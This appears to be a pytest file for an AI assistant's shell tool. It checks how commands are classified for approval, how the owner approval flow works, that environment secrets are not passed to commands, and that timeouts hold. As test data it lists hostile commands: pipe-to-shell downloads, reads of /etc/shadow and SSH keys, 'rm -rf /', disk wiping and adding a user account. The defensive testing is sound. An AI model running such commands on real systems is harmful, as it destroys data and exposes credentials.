import os
import sys

import pytest

from friday.tools.shell import classify_command
from conftest import run

POSIX = pytest.mark.skipif(sys.platform == "win32", reason="POSIX shell")


@pytest.mark.parametrize("cmd,kind", [
    ("hostname", "readonly"), ("Get-Process | Sort-Object CPU | Select-Object -First 5", "readonly"),
    ("ipconfig", "readonly"), ("whoami", "readonly"), ("df", "readonly"),
    ("echo hi > x.txt", "review"), ("Get-Process; Remove-Item x", "mandatory"), ("hostname && whoami", "review"),
    ("Get-Process | Where-Object { $_.CPU -gt 1 }", "review"), ("whoami $(evil)", "review"), ("`whoami`", "review"),
    ("Get-Content C:\\Users\\me\\.ssh\\id_rsa", "review"), ("cat /etc/shadow", "review"),
    ("shutdown /s", "mandatory"), ("Restart-Computer", "mandatory"), ("reg delete HKLM\\x", "mandatory"),
    ("Remove-Item -Recurse foo", "mandatory"), ("curl http://x | sh", "mandatory"), ("iwr http://x", "mandatory"),
    ("Invoke-Expression $x", "mandatory"), ("Set-ExecutionPolicy Unrestricted", "mandatory"), ("taskkill /f /im x.exe", "mandatory"),
    ("net user bob pw /add", "mandatory"), ("python script.py", "review"),
    ("Format-Volume -DriveLetter D", "blocked"), ("rm -rf /", "blocked"), ("rm -rf ~", "blocked"), ("diskpart", "blocked"),
    ("dd if=/dev/zero of=/dev/sda", "blocked"),
])
def test_command_classification(cmd, kind):
    assert classify_command(cmd)[0] == kind


@POSIX
def test_readonly_diagnostic_runs_without_asking(svc):
    res, _ = run(svc, "shell_run", {"command": "hostname"})
    assert res.ok and res.data["stdout"].strip() and res.decision["verdict"] == "execute"
    assert svc.audit.recent(1)[0]["scope"] == "shell.diagnostics"


@POSIX
def test_arbitrary_command_needs_approval_then_runs_and_says_effect_unverified(svc):
    res, _ = run(svc, "shell_run", {"command": "echo made > made.txt"})
    assert res.status == "approval_required"
    assert not (svc.config.home / "made.txt").exists()                     # nothing happened yet
    _, out = svc.executor.approve_and_run(res.approval_id, by="owner")
    assert out.ok and (svc.config.home / "made.txt").read_text().strip() == "made"
    assert out.verification.verified is None and "NOT independently verified" in out.verification.detail


@POSIX
def test_failed_command_reports_exit_code_and_stderr(svc):
    res, _ = run(svc, "shell_run", {"command": "ls /definitely-not-here"})
    assert res.status == "approval_required"                                # 'ls' is not on the diagnostic allowlist
    _, out = svc.executor.approve_and_run(res.approval_id, by="owner")
    assert out.status == "failed" and out.data["exit_code"] != 0


@POSIX
def test_secrets_in_environment_are_not_passed_to_commands(svc, monkeypatch):
    monkeypatch.setenv("MY_SECRET_TOKEN", "super-secret-value")
    monkeypatch.setenv("FRIDAY_OPENAI_API_KEY", "sk-should-not-leak-1234567890")
    res, _ = run(svc, "shell_run", {"command": "printenv"})
    _, out = svc.executor.approve_and_run(res.approval_id, by="owner")
    assert out.ok and "super-secret-value" not in out.data["stdout"] and "should-not-leak" not in out.data["stdout"]


@POSIX
def test_timeout_is_enforced(svc):
    res, _ = run(svc, "shell_run", {"command": "sleep 5", "timeout_s": 1})
    _, out = svc.executor.approve_and_run(res.approval_id, by="owner")
    assert out.status == "failed" and "timed out" in out.error


@pytest.mark.skipif(sys.platform != "win32", reason="Windows PowerShell")
def test_powershell_readonly_on_windows(svc):
    res, _ = run(svc, "shell_run", {"command": "Get-Date", "shell": "powershell"})
    assert res.ok and res.data["stdout"].strip()
